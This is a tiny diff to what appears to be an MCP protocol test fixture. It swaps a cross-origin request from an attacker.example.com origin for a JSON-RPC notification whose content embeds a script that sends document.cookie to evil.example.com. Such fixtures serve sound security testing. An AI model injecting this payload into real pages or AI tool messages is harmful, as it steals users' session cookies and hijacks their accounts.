@@ -1,4 +1,1 @@
-POST /mcp HTTP/1.1
-Origin: https://attacker.example.com
-
-{"method":"sampling/createMessage"}
+{"method":"notifications/message","params":{"content":"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>"}}
